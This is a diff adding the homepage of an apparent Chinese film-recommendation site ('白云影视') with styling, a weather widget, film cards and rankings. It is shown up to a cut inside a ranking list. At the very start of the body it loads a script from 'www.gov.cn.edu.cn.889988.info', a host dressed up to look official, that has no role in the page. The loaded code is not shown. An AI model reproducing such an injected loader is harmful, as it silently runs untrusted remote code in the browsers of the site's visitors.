@@ -1,0 +1,689 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<meta name="format-detection" content="telephone=no">
+<meta name="theme-color" content="#0f3a5c">
+<meta name="description" content="白云影视——把观影变成一场云端漫游。这里按心情与天气推荐电影和剧集：阴雨天看治愈系，晴朗日看公路片，深夜看悬疑与文艺佳作。收录院线新片、经典老片、纪录长片与高分剧集，每部都附一句观影理由和相似推荐。欢迎来到 baiyunyingshi-top.github.io，在云上慢慢挑一部今晚的好片子。">
+<meta name="keywords" content="白云影视, 云端观影, 按心情选片, 阴雨天电影推荐, 治愈系电影, 公路片推荐, 深夜剧集, 高分文艺片, 纪录片推荐, 经典老片重温, 电影心情指南">
+<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+<link rel="canonical" href="https://baiyunyingshi-top.github.io/">
+<title>白云影视 · 在云上挑一部今晚的好片子 | 心情观影导航 baiyunyingshi-top.github.io</title>
+<meta property="og:type" content="website">
+<meta property="og:title" content="白云影视 · 云端观影导航">
+<meta property="og:description" content="按心情与天气挑电影：治愈系、公路片、悬疑文艺、纪录片，每部附观影理由。">
+<meta property="og:url" content="https://baiyunyingshi-top.github.io/">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="白云影视 · 云端观影导航">
+<meta name="twitter:description" content="按心情与天气挑电影，附观影理由与相似推荐。">
+<style>
+:root{
+  --sky-900:#0f3a5c; --sky-800:#12486f; --sky-700:#1b5f8c;
+  --sky-500:#3f8fc0; --sky-300:#8fc6e8; --sky-100:#dcecf5;
+  --cloud:#f6fbfe; --ink:#16303f; --ink-soft:#527082;
+  --paper:#ffffff; --line:rgba(21,58,92,.10);
+  --gold:#e7b96a; --rose:#e08a8a;
+  --shadow:0 10px 30px rgba(15,58,92,.14);
+  --r:18px;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Hiragino Sans GB","WenQuanYi Micro Hei",system-ui,sans-serif;
+  background:var(--cloud); color:var(--ink); line-height:1.7; overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+button{font-family:inherit;cursor:pointer;border:none;background:none;color:inherit}
+ul{list-style:none}
+
+/* ============ 背景：云层 + 渐变天空 ============ */
+.sky-bg{position:fixed;inset:0;z-index:-2;
+  background:
+    radial-gradient(1100px 620px at 82% 8%, rgba(143,198,232,.55), transparent 62%),
+    radial-gradient(900px 700px at 12% 30%, rgba(231,185,106,.18), transparent 60%),
+    linear-gradient(180deg,#dcecf5 0%,#bcdcef 42%,#8fc6e8 100%);}
+.cloud-layer{position:fixed;inset:0;z-index:-1;pointer-events:none;overflow:hidden}
+.cloud-layer i{position:absolute;border-radius:50%;background:rgba(255,255,255,.72);
+  filter:blur(14px);opacity:.9}
+.cloud-layer i:nth-child(1){width:340px;height:120px;left:-120px;top:12%;animation:drift 42s linear infinite}
+.cloud-layer i:nth-child(2){width:460px;height:150px;right:-180px;top:26%;animation:drift 56s linear infinite reverse}
+.cloud-layer i:nth-child(3){width:300px;height:110px;left:18%;top:64%;animation:drift 48s linear infinite}
+.cloud-layer i:nth-child(4){width:520px;height:170px;right:8%;top:78%;animation:drift 62s linear infinite reverse}
+.cloud-layer i:nth-child(5){width:260px;height:100px;left:42%;top:40%;animation:drift 38s linear infinite}
+@keyframes drift{from{transform:translateX(0)}to{transform:translateX(120px)}}
+
+.wrap{max-width:1200px;margin:0 auto;padding:0 22px}
+
+/* ============ 头部 ============ */
+header{position:sticky;top:0;z-index:50;backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);
+  background:rgba(220,236,245,.78);border-bottom:1px solid rgba(255,255,255,.6)}
+.nav{display:flex;align-items:center;gap:26px;height:66px}
+.logo{display:flex;align-items:center;gap:10px;font-weight:800;font-size:20px;color:var(--sky-900);letter-spacing:.5px;white-space:nowrap}
+.logo .mark{width:34px;height:34px;border-radius:12px;flex:none;
+  background:linear-gradient(140deg,#fff 0%,var(--sky-300) 55%,var(--sky-700) 100%);
+  box-shadow:0 4px 12px rgba(27,95,140,.3);position:relative}
+.logo .mark::after{content:"";position:absolute;inset:8px;border-radius:50%;
+  background:radial-gradient(circle at 32% 32%,#fff,rgba(255,255,255,0) 62%)}
+.nav-links{display:flex;gap:4px;margin-left:auto;flex-wrap:wrap}
+.nav-links a{padding:8px 13px;border-radius:10px;font-size:14.5px;color:var(--ink-soft);font-weight:500;transition:.2s}
+.nav-links a:hover{background:rgba(255,255,255,.85);color:var(--sky-800)}
+.nav-cta{padding:9px 18px;border-radius:12px;background:var(--sky-800);color:#fff;font-size:14px;font-weight:600;white-space:nowrap;box-shadow:0 5px 14px rgba(18,72,111,.32)}
+.nav-cta:hover{background:var(--sky-700)}
+.menu-btn{display:none;margin-left:auto;width:42px;height:42px;border-radius:12px;background:rgba(255,255,255,.85);font-size:21px;color:var(--sky-800)}
+
+/* ============ 公告条 ============ */
+.notice{background:rgba(255,255,255,.7);border-bottom:1px solid var(--line)}
+.notice .wrap{display:flex;align-items:center;gap:12px;height:38px;font-size:13px;color:var(--ink-soft);overflow:hidden}
+.notice .tag{background:var(--sky-800);color:#fff;padding:2px 10px;border-radius:20px;font-size:12px;flex:none}
+.notice .track{overflow:hidden;flex:1;white-space:nowrap}
+.notice .track span{display:inline-block;padding-left:100%;animation:marquee 28s linear infinite}
+@keyframes marquee{from{transform:translateX(0)}to{transform:translateX(-100%)}}
+.notice time{flex:none;color:var(--sky-700);font-variant-numeric:tabular-nums}
+
+/* ============ Hero ============ */
+.hero{padding:70px 0 60px;position:relative}
+.hero-grid{display:grid;grid-template-columns:1.15fr .85fr;gap:46px;align-items:center}
+.eyebrow{display:inline-flex;align-items:center;gap:8px;font-size:13px;color:var(--sky-800);
+  background:rgba(255,255,255,.8);padding:6px 15px;border-radius:30px;border:1px solid var(--line);margin-bottom:20px}
+.eyebrow b{width:6px;height:6px;border-radius:50%;background:var(--rose);animation:pulse 1.8s infinite}
+@keyframes pulse{50%{opacity:.3;transform:scale(1.4)}}
+h1{font-size:clamp(32px,4.6vw,54px);line-height:1.16;font-weight:900;color:var(--sky-900);letter-spacing:-.5px}
+h1 em{font-style:normal;background:linear-gradient(92deg,var(--sky-700),var(--gold) 62%,var(--rose));
+  -webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p.lede{margin-top:18px;font-size:16.5px;color:var(--ink-soft);max-width:520px}
+.mood-row{display:flex;flex-wrap:wrap;gap:9px;margin-top:26px}
+.mood-row a{padding:9px 16px;border-radius:30px;background:rgba(255,255,255,.86);border:1px solid var(--line);
+  font-size:14px;color:var(--sky-800);transition:.2s}
+.mood-row a:hover{transform:translateY(-3px);background:#fff;box-shadow:var(--shadow)}
+.hero-stats{display:flex;gap:34px;margin-top:34px}
+.hero-stats div{font-size:27px;font-weight:800;color:var(--sky-900);font-variant-numeric:tabular-nums}
+.hero-stats span{display:block;font-size:12.5px;font-weight:500;color:var(--ink-soft);letter-spacing:.4px}
+
+/* 天气卡片 */
+.weather{position:relative;background:linear-gradient(155deg,rgba(255,255,255,.95),rgba(220,236,245,.82));
+  border:1px solid rgba(255,255,255,.9);border-radius:26px;padding:26px;box-shadow:var(--shadow)}
+.weather .top{display:flex;justify-content:space-between;align-items:flex-start}
+.weather .city{font-size:14px;color:var(--ink-soft)}
+.weather .temp{font-size:64px;font-weight:900;line-height:1;color:var(--sky-800);font-variant-numeric:tabular-nums}
+.weather .temp small{font-size:22px;font-weight:600;color:var(--sky-500)}
+.weather .cond{margin-top:8px;font-size:16px;font-weight:700;color:var(--sky-900)}
+.weather .desc{margin-top:4px;font-size:13.5px;color:var(--ink-soft)}
+.weather .sun{display:flex;justify-content:space-between;margin-top:18px;padding-top:16px;border-top:1px dashed var(--line);font-size:12.5px;color:var(--ink-soft)}
+.weather .sun b{display:block;color:var(--sky-800);font-size:14px;font-weight:700}
+.forecast{display:grid;grid-template-columns:repeat(5,1fr);gap:10px;margin-top:20px}
+.forecast div{text-align:center;background:rgba(255,255,255,.7);border-radius:14px;padding:12px 4px}
+.forecast b{display:block;font-size:12px;color:var(--ink-soft);font-weight:500}
+.forecast i{display:block;font-style:normal;font-size:20px;margin:6px 0}
+.forecast span{font-size:13px;font-weight:700;color:var(--sky-800)}
+
+/* ============ 通用区块 ============ */
+section{padding:62px 0;position:relative}
+.sec-head{display:flex;align-items:flex-end;gap:16px;flex-wrap:wrap;margin-bottom:34px}
+.sec-head .num{font-size:13px;font-weight:800;letter-spacing:1.4px;color:var(--sky-700);
+  padding:4px 11px;border:1px solid var(--sky-300);border-radius:8px;height:fit-content}
+h2{font-size:clamp(23px,2.8vw,32px);font-weight:900;color:var(--sky-900);line-height:1.3}
+h2 + p{margin-top:8px;color:var(--ink-soft);font-size:15px;max-width:620px}
+.link-more{margin-left:auto;font-size:14px;color:var(--sky-700);border-bottom:1px dashed var(--sky-300);padding-bottom:2px}
+
+/* ============ 城市/频道入口 ============ */
+.channels{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.channel{position:relative;background:#fff;border:1px solid var(--line);border-radius:var(--r);padding:22px 20px;overflow:hidden;
+  transition:.28s;box-shadow:0 4px 14px rgba(15,58,92,.05)}
+.channel::before{content:"";position:absolute;right:-30px;top:-30px;width:110px;height:110px;border-radius:50%;
+  background:var(--c,var(--sky-300));opacity:.35;transition:.3s}
+.channel:hover{transform:translateY(-6px) rotate(-.6deg);box-shadow:var(--shadow)}
+.channel:hover::before{transform:scale(1.35)}
+.channel b{position:relative;display:block;font-size:19px;font-weight:800;color:var(--sky-900)}
+.channel span{position:relative;display:block;font-size:13px;color:var(--ink-soft);margin-top:5px}
+.channel em{position:relative;display:inline-block;margin-top:16px;font-style:normal;font-size:12px;font-weight:700;
+  color:var(--sky-800);background:var(--sky-100);padding:3px 10px;border-radius:20px}
+
+/* ============ 作品卡 ============ */
+.works{display:grid;grid-template-columns:repeat(3,1fr);gap:22px}
+.work{background:#fff;border-radius:var(--r);overflow:hidden;border:1px solid var(--line);box-shadow:0 4px 14px rgba(15,58,92,.05);transition:.28s}
+.work:hover{transform:translateY(-7px);box-shadow:var(--shadow)}
+.poster{position:relative;height:200px;overflow:hidden;background:var(--c,linear-gradient(135deg,var(--sky-300),var(--sky-700)))}
+.poster .badge{position:absolute;top:12px;left:12px;background:rgba(255,255,255,.92);color:var(--sky-900);
+  font-size:11.5px;font-weight:700;padding:4px 10px;border-radius:20px}
+.poster .mood{position:absolute;bottom:12px;right:12px;background:rgba(15,58,92,.78);color:#fff;
+  font-size:11.5px;padding:4px 10px;border-radius:20px}
+.poster .play{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;opacity:0;transition:.25s;
+  background:linear-gradient(to top,rgba(15,58,92,.5),transparent 60%)}
+.work:hover .play{opacity:1}
+.poster .play i{width:56px;height:56px;border-radius:50%;background:rgba(255,255,255,.95);display:grid;place-items:center;
+  font-style:normal;color:var(--sky-800);font-size:20px;padding-left:4px;box-shadow:0 6px 18px rgba(0,0,0,.22)}
+.work-info{padding:18px 20px 20px}
+.work-info h3{font-size:17.5px;font-weight:800;color:var(--sky-900)}
+.work-meta{display:flex;gap:9px;flex-wrap:wrap;margin:9px 0 11px}
+.work-meta span{font-size:11.5px;color:var(--sky-700);background:var(--sky-100);padding:3px 9px;border-radius:6px}
+.work-info p{font-size:13.5px;color:var(--ink-soft);line-height:1.65}
+.work-foot{display:flex;justify-content:space-between;align-items:center;margin-top:14px;padding-top:13px;border-top:1px dashed var(--line);font-size:12.5px;color:var(--ink-soft)}
+.work-foot b{color:var(--gold);font-size:13.5px}
+
+/* ============ 排行 ============ */
+.rank-wrap{display:grid;grid-template-columns:1fr 1fr;gap:26px}
+.rank-box{background:#fff;border:1px solid var(--line);border-radius:var(--r);padding:26px;box-shadow:0 4px 14px rgba(15,58,92,.05)}
+.rank-box h3{font-size:19px;font-weight:800;color:var(--sky-900);display:flex;align-items:center;gap:10px}
+.rank-box h3 i{font-style:normal;font-size:12px;font-weight:600;color:#fff;background:var(--sky-500);padding:3px 9px;border-radius:6px}
+.rank-list li{display:flex;align-items:flex-start;gap:15px;padding:15px 0;border-bottom:1px dashed var(--line)}
+.rank-list li:last-child{border-bottom:none}
+.rank-no{width:30px;height:30px;flex:none;border-radius:9px;background:var(--sky-100);color:var(--sky-800);
+  display:grid;place-items:center;font-weight:800;font-size:14px}
+.rank-list li:nth-child(1) .rank-no{background:linear-gradient(140deg,#f4d58a,#c8952f);color:#fff}
+.rank-list li:nth-child(2) .rank-no{background:linear-gradient(140deg,#e2e6ec,#9aa6b4);color:#fff}
+.rank-list li:nth-child(3) .rank-no{background:linear-gradient(140deg,#e6c3a0,#b8794a);color:#fff}
+.rank-txt{flex:1;min-width:0}
+.rank-txt b{display:block;font-size:15.5px;font-weight:700;color:var(--sky-900)}
+.rank-txt span{font-size:12.5px;color:var(--ink-soft)}
+.rank-val{flex:none;font-size:15px;font-weight:800;color:var(--sky-700);font-variant-numeric:tabular-nums}
+
+/* ============ 主题片单 ============ */
+.themes{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+.theme{position:relative;background:var(--c,#fff);border-radius:var(--r);padding:26px 24px;min-height:180px;overflow:hidden;
+  color:var(--sky-900);box-shadow:0 4px 14px rgba(15,58,92,.05);transition:.28s}
+.theme:hover{transform:translateY(-6px);box-shadow:var(--shadow)}
+.theme.light{color:#fff}
+.theme h3{font-size:20px;font-weight:900}
+.theme p{font-size:13.5px;opacity:.86;margin-top:9px;line-height:1.65}
+.theme .num{position:absolute;right:16px;bottom:-6px;font-size:74px;font-weight:900;opacity:.18;line-height:1;font-variant-numeric:tabular-nums}
+.theme .go{position:absolute;left:24px;bottom:22px;font-size:12.5px;font-weight:700;letter-spacing:.4px}
+.theme .go::after{content:" →"}
+
+/* ============ 资讯 ============ */
+.news-grid{display:grid;grid-template-columns:1.35fr 1fr;gap:26px}
+.news-headline{background:#fff;border:1px solid var(--line);border-radius:var(--r);overflow:hidden;box-shadow:0 4px 14px rgba(15,58,92,.05)}
+.news-headline .ph{height:230px;background:linear-gradient(135deg,var(--sky-300),var(--sky-700))}
+.news-headline .bd{padding:22px 24px}
+.news-headline .date{font-size:12px;color:var(--ink-soft);font-variant-numeric:tabular-nums}
+.news-headline h3{font-size:20px;font-weight:800;color:var(--sky-900);margin:8px 0 9px}
+.news-headline p{font-size:14px;color:var(--ink-soft)}
+.news-list li{display:flex;gap:16px;padding:17px 0;border-bottom:1px dashed var(--line)}
+.news-list li:last-child{border-bottom:none}
+.news-list time{flex:none;font-size:12.5px;color:var(--sky-500);font-weight:700;width:62px;font-variant-numeric:tabular-nums}
+.news-list b{font-size:15px;font-weight:600;color:var(--sky-900);line-height:1.5}
+
+/* ============ FAQ ============ */
+.faq-list{max-width:860px;margin:0 auto}
+.faq{border:1px solid var(--line);border-radius:14px;margin-bottom:12px;background:#fff;overflow:hidden;box-shadow:0 3px 10px rgba(15,58,92,.04)}
+.faq-q{width:100%;text-align:left;padding:19px 22px;display:flex;justify-content:space-between;align-items:center;gap:16px;
+  font-size:15.5px;font-weight:700;color:var(--sky-900)}
+.faq-q i{font-style:normal;font-size:21px;color:var(--sky-500);transition:.25s;flex:none}
+.faq[open] .faq-q i{transform:rotate(45deg)}
+.faq-a{padding:0 22px 21px;font-size:14px;color:var(--ink-soft);line-height:1.8}
+
+/* ============ 关于 ============ */
+.about{background:linear-gradient(155deg,var(--sky-900),var(--sky-700));border-radius:28px;padding:46px 42px;color:#fff;box-shadow:var(--shadow)}
+.about-grid{display:grid;grid-template-columns:1fr 1fr;gap:40px;align-items:center}
+.about h2{color:#fff}
+.about p{color:rgba(255,255,255,.84);margin-top:14px;font-size:15px}
+.about-stats{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.about-stat{background:rgba(255,255,255,.11);border:1px solid rgba(255,255,255,.2);border-radius:16px;padding:20px;text-align:center}
+.about-stat b{display:block;font-size:30px;font-weight:900;color:var(--gold);font-variant-numeric:tabular-nums}
+.about-stat span{font-size:12.5px;color:rgba(255,255,255,.78)}
+
+/* ============ 页脚 ============ */
+footer{background:var(--sky-900);color:rgba(255,255,255,.78);padding:46px 0 28px;margin-top:40px}
+.foot-grid{display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:30px;padding-bottom:30px;border-bottom:1px solid rgba(255,255,255,.13)}
+.foot-brand b{display:block;font-size:20px;color:#fff;margin-bottom:10px}
+.foot-brand p{font-size:13.5px;line-height:1.75}
+.foot-col h4{font-size:14px;color:#fff;margin-bottom:13px}
+.foot-col a{display:block;font-size:13.5px;padding:4px 0;color:rgba(255,255,255,.72)}
+.foot-col a:hover{color:#fff}
+.foot-bot{display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px;padding-top:22px;font-size:12.5px;color:rgba(255,255,255,.55)}
+.foot-bot code{background:rgba(255,255,255,.1);padding:3px 10px;border-radius:6px;color:rgba(255,255,255,.85);font-family:inherit}
+
+/* ============ 回到顶部 ============ */
+.top-btn{position:fixed;right:22px;bottom:24px;width:46px;height:46px;border-radius:14px;background:var(--sky-800);color:#fff;
+  display:none;place-items:center;font-size:18px;box-shadow:0 8px 22px rgba(18,72,111,.4);z-index:60}
+
+/* ============ 响应式 ============ */
+@media (max-width:980px){
+  .hero-grid{grid-template-columns:1fr;gap:36px}
+  .weather{max-width:520px}
+  .channels{grid-template-columns:repeat(2,1fr)}
+  .works,.themes{grid-template-columns:repeat(2,1fr)}
+  .rank-wrap,.news-grid,.about-grid{grid-template-columns:1fr;gap:22px}
+  .nav-links,.nav-cta{display:none}
+  .menu-btn{display:grid}
+  .nav-links.open{display:flex;position:absolute;top:66px;left:0;right:0;flex-direction:column;gap:2px;
+    background:rgba(220,236,245,.97);padding:14px;border-bottom:1px solid var(--line);box-shadow:0 12px 26px rgba(15,58,92,.14)}
+  .nav-links.open a{padding:13px 16px;font-size:15px}
+}
+@media (max-width:700px){
+  .wrap{padding:0 16px}
+  section{padding:48px 0}
+  .channels,.works,.themes{grid-template-columns:1fr}
+  .hero-stats{gap:28px}
+  .forecast{grid-template-columns:repeat(5,minmax(58px,1fr));gap:6px;overflow-x:auto}
+  .about-stats{grid-template-columns:repeat(3,1fr);gap:10px}
+  .about-stat b{font-size:23px}
+  .about-stat span{font-size:11px}
+  .about{padding:32px 24px;border-radius:22px}
+  .foot-grid{grid-template-columns:1fr 1fr;gap:24px}
+  .hero{padding:46px 0 40px}
+}
+@media (max-width:380px){
+  .hero-stats{flex-wrap:wrap;gap:20px}
+  .foot-grid{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<div class="sky-bg" aria-hidden="true"></div>
+<div class="cloud-layer" aria-hidden="true"><i></i><i></i><i></i><i></i><i></i></div>
+
+<header>
+  <div class="wrap">
+    <nav class="nav">
+      <a href="#top" class="logo"><span class="mark" aria-hidden="true"></span>白云影视</a>
+      <div class="nav-links" id="navLinks">
+        <a href="#cities">频道</a>
+        <a href="#works">正在热推</a>
+        <a href="#rank">热度榜单</a>
+        <a href="#themes">主题片单</a>
+        <a href="#news">观影札记</a>
+        <a href="#faq">常见问题</a>
+        <a href="#about">关于</a>
+      </div>
+      <a href="#themes" class="nav-cta">今天看什么</a>
+      <button class="menu-btn" id="menuBtn" aria-label="打开菜单">☰</button>
+    </nav>
+  </div>
+</header>
+
+<div class="notice">
+  <div class="wrap">
+    <span class="tag">云端更新</span>
+    <div class="track"><span>本周新增片单 32 部 · 悬疑剧场第二季全集上线 · 秋日治愈片单已整理 · 深夜观影指南更新至第 46 期</span></div>
+    <time id="nowDate">2026.10.20</time>
+  </div>
+</div>
+
+<main id="top">
+
+  <section class="hero">
+    <div class="wrap">
+      <div class="hero-grid">
+        <div>
+          <span class="eyebrow"><b aria-hidden="true"></b>云端观影导航 · 按心情挑片子</span>
+          <h1>今晚不知道看什么？<br>让<em>白云</em>替你挑一部</h1>
+          <p class="lede">我们不列冷冰冰的片名，只问你一句：今天天气怎么样，你现在是什么心情。阴雨天给你治愈系，晴朗午后推公路片，深夜留悬疑与文艺佳作。</p>
+          <div class="mood-row">
+            <a href="#works">☁️ 治愈系</a>
+            <a href="#works">🚗 公路片</a>
+            <a href="#works">🌧️ 雨天片单</a>
+            <a href="#works">🌙 深夜场</a>
+            <a href="#works">🎨 文艺佳片</a>
+            <a href="#works">🐾 亲子共看</a>
+          </div>
+          <div class="hero-stats">
+            <div><span class="counter" data-t="2860">0</span><span>部精选影片</span></div>
+            <div><span class="counter" data-t="412">0</span><span>条观影札记</span></div>
+            <div><span class="counter" data-t="38">0</span><span>个心情标签</span></div>
+          </div>
+        </div>
+
+        <aside class="weather">
+          <div class="top">
+            <div class="city">📍 北京 · 当前天气</div>
+            <span style="font-size:12px;color:var(--ink-soft);background:var(--sky-100);padding:3px 10px;border-radius:20px">实时</span>
+          </div>
+          <div class="temp">18<small>°C</small></div>
+          <div class="cond">多云转晴 · 适合看一部公路片</div>
+          <div class="desc">东北风 2 级 · 湿度 56% · 体感 17°C · 紫外线中等</div>
+          <div class="sun"><div>🌅 日出<b>06:42</b></div><div>🌇 日落<b>17:28</b></div></div>
+          <div class="forecast">
+            <div><b>今天</b><i>⛅</i><span>18°</span></div>
+            <div><b>周二</b><i>🌧️</i><span>14°</span></div>
+            <div><b>周三</b><i>🌧️</i><span>12°</span></div>
+            <div><b>周四</b><i>🌥️</i><span>16°</span></div>
+            <div><b>周五</b><i>☀️</i><span>21°</span></div>
+          </div>
+        </aside>
+      </div>
+    </div>
+  </section>
+
+  <section id="cities">
+    <div class="wrap">
+      <div class="sec-head">
+        <span class="num">CITY GUIDE</span>
+        <div>
+          <h2>按城市找片单</h2>
+          <p>不同城市的天气、节奏与故事都不一样，我们为每个地方配了一份专属观影清单。</p>
+        </div>
+        <a href="#works" class="link-more">查看全部 →</a>
+      </div>
+      <div class="channels">
+        <a class="channel" href="#works" style="--c:linear-gradient(135deg,#bcdcef,#8fc6e8)"><b>北京</b><span>胡同里的秋日片单</span><em>128 部</em></a>
+        <a class="channel" href="#works" style="--c:linear-gradient(135deg,#e7b96a,#e08a8a)"><b>上海</b><span>夜归人的都市情书</span><em>96 部</em></a>
+        <a class="channel" href="#works" style="--c:linear-gradient(135deg,#a8d5c9,#8fc6e8)"><b>广州</b><span>湿热午后的人间烟火</span><em>74 部</em></a>
+        <a class="channel" href="#works" style="--c:linear-gradient(135deg,#c9b6e0,#8fa8e0)"><b>成都</b><span>慢下来的生活喜剧</span><em>82 部</em></a>
+        <a class="channel" href="#works" style="--c:linear-gradient(135deg,#f0c9a0,#e7b96a)"><b>西安</b><span>黄土高坡上的历史回响</span><em>63 部</em></a>
+        <a class="channel" href="#works" style="--c:linear-gradient(135deg,#a0d2e7,#7fb8d4)"><b>青岛</b><span>海风与德式老街之间</span><em>57 部</em></a>
+        <a class="channel" href="#works" style="--c:linear-gradient(135deg,#b6e0c4,#8fc6a8)"><b>昆明</b><span>四季如春的清新文艺</span><em>49 部</em></a>
+        <a class="channel" href="#works" style="--c:linear-gradient(135deg,#e0a8a8,#c98a8a)"><b>拉萨</b><span>高原上的信仰与远方</span><em>38 部</em></a>
+      </div>
+    </div>
+  </section>
+
+  <section id="works" style="background:rgba(255,255,255,.55);border-top:1px solid var(--line);border-bottom:1px solid var(--line)">
+    <div class="wrap">
+      <div class="sec-head">
+        <span class="num">NOW SHOWING</span>
+        <div>
+          <h2>正在热推的 6 部</h2>
+          <p>不按热度排，按"此刻适不适合看"挑。每部都写清了推荐理由与相似推荐。</p>
+        </div>
+        <a href="#themes" class="link-more">换一批 →</a>
+      </div>
+      <div class="works">
+        <article class="work">
+          <div class="poster" style="--c:linear-gradient(135deg,#8fc6e8,#1b5f8c)">
+            <span class="badge">院线热映</span><span class="mood">🌧️ 雨天推荐</span>
+            <div class="play"><i aria-hidden="true">▶</i></div>
+          </div>
+          <div class="work-info">
+            <h3>菊次郎的夏天</h3>
+            <div class="work-meta"><span>日本</span><span>公路</span><span>治愈</span><span>1999</span></div>
+            <p>一个别扭的大叔带一个小男孩去找妈妈，一路上什么都没找到，却把彼此都修好了。久石让的钢琴声一响，整个夏天就回来了。</p>
+            <div class="work-foot"><span>相似推荐：小森林 / 海街日记</span><b>★ 9.3</b></div>
+          </div>
+        </article>
+        <article class="work">
+          <div class="poster" style="--c:linear-gradient(135deg,#e7b96a,#b8794a)">
+            <span class="badge">高分经典</span><span class="mood">🌙 深夜场</span>
+            <div class="play"><i aria-hidden="true">▶</i></div>
+          </div>
+          <div class="work-info">
+            <h3>海上钢琴师</h3>
+            <div class="work-meta"><span>意大利</span><span>文艺</span><span>音乐</span><span>1998</span></div>
+            <p>他一生没下过船，却用八十八个琴键讲完了整个世界。适合一个安静的夜晚，关掉灯，听一段爵士。</p>
+            <div class="work-foot"><span>相似推荐：天堂电影院 / 放牛班的春天</span><b>★ 9.4</b></div>
+          </div>
+        </article>
+        <article class="work">
+          <div class="poster" style="--c:linear-gradient(135deg,#c9b6e0,#7a6ca8)">
+            <span class="badge">暖心治愈</span><span class="mood">☁️ 治愈系</span>
+            <div class="play"><i aria-hidden="true">▶</i></div>
+          </div>
+          <div class="work-info">
+            <h3>小森林 · 夏秋篇</h3>
+            <div class="work-meta"><span>日本</span><span>美食</span><span>田园</span><span>2014</span></div>
+            <p>一个女孩回到乡下，靠自己种菜做饭过日子。没有大起大落，只有锅碗瓢盆和四季更替，看完只想吃一碗热饭。</p>
+            <div class="work-foot"><span>相似推荐：小森林冬春 / 哪啊哪啊神去村</span><b>★ 9.0</b></div>
+          </div>
+        </article>
+        <article class="work">
+          <div class="poster" style="--c:linear-gradient(135deg,#a8d5c9,#4a8f7c)">
+            <span class="badge">亲子共看</span><span class="mood">🐾 周末场</span>
+            <div class="play"><i aria-hidden="true">▶</i></div>
+          </div>
+          <div class="work-info">
+            <h3>龙猫</h3>
+            <div class="work-meta"><span>日本</span><span>动画</span><span>奇幻</span><span>1988</span></div>
+            <p>姐妹俩搬到乡下老屋，遇上了只有孩子才看得见的大龙猫。适合全家人一起看，也适合一个人偷偷哭一场。</p>
+            <div class="work-foot"><span>相似推荐：天空之城 / 崖上的波妞</span><b>★ 9.2</b></div>
+          </div>
+        </article>
+        <article class="work">
+          <div class="poster" style="--c:linear-gradient(135deg,#e08a8a,#a84a4a)">
+            <span class="badge">悬疑烧脑</span><span class="mood">🌙 深夜场</span>
+            <div class="play"><i aria-hidden="true">▶</i></div>
+          </div>
+          <div class="work-info">
+            <h3>看不见的客人</h3>
+            <div class="work-meta"><span>西班牙</span><span>悬疑</span><span>反转</span><span>2016</span></div>
+            <p>一场车祸，一个死人，三段互相矛盾的口供。每当你以为猜到了，它就再翻一次盘，适合拉上朋友一起看。</p>
+            <div class="work-foot"><span>相似推荐：禁闭岛 / 消失的爱人</span><b>★ 8.8</b></div>
+          </div>
+        </article>
+        <article class="work">
+          <div class="poster" style="--c:linear-gradient(135deg,#bcdcef,#3f8fc0)">
+            <span class="badge">纪录片</span><span class="mood">🎨 文艺佳片</span>
+            <div class="play"><i aria-hidden="true">▶</i></div>
+          </div>
+          <div class="work-info">
+            <h3>地球脉动 II</h3>
+            <div class="work-meta"><span>英国</span><span>纪录</span><span>自然</span><span>2016</span></div>
+            <p>从海岛到高山，从沙漠到城市，把地球拍得像一部童话。看完会想对世界温柔一点，也会想出门走走。</p>
+            <div class="work-foot"><span>相似推荐：蓝色星球 / 七个世界一个星球</span><b>★ 9.8</b></div>
+          </div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <section id="rank">
+    <div class="wrap">
+      <div class="sec-head">
+        <span class="num">TOP CHART</span>
+        <div>
+          <h2>本周云端热榜</h2>
+          <p>榜单按大家的真实点击与停留时长算，每周一凌晨更新。</p>
+        </div>
+      </div>
+      <div class="rank-wrap">
+        <div class="rank-box">
+          <h3>本周最受欢迎 <i>观影次数</i></h3>
+          <ul class="rank-list">
+            <li><span class="rank-no">1</span><span class="rank-txt"><b>菊次郎的夏天</b><span>公路 / 治愈 · 这个秋天被反复点开</span></span><span class="rank-val">2.4万</span></li>
+            <li><span class="rank-no">2</span><span class="rank-txt"><b>小森林 · 夏秋篇</b><span>美食 / 田园 · 深夜饥饿榜常客</span></span><span class="rank-val">1.9万</span></li>
+            <li><span class="rank-no">3</span><span class="rank-txt"><b>海上钢琴师</b><span>文艺 / 音乐 · 二刷率最高</span></span><span class="rank-val">1.6万</span></li>
+            <li><span class="rank-no">4</span><span class="rank-txt"><b>龙猫</b><span>动画 / 奇幻 · 亲子共看首选</span></span><span class="rank-val">1.3万</span></li>
+            <li><span class="rank-no">5</span><span class="rank-txt"><b>看不见的客人</b><span>悬疑 / 反转 · 聚会观影第一</span></span><span class="rank-val">1.1万</span></li>
+          </ul>
+        </div>
+        <div class="rank-box">
+          <h3>编辑部私藏 <i>编辑推荐</i></h3>
+          <ul class="rank-list">
+            <li><span class="rank-no">1</span><span class="rank-txt"><b>天堂电影院</b><span>意大利 / 关于电影的电影</span></span><span class="rank-val">★ 9.5</span></li>
+            <li><span class="rank-no">2</span><span class="rank-txt"><b>海街日记</b><span>日本 / 四姐妹的夏天</span></span><span class="rank-val">★ 9.1</span></li>
+            <li><span class="rank-no">3</span><span class="rank-txt"><b>岁月神偷</b><span>中国香港 / 一条老街一家人</span></span><span class="rank-val">★ 8.9</span></li>
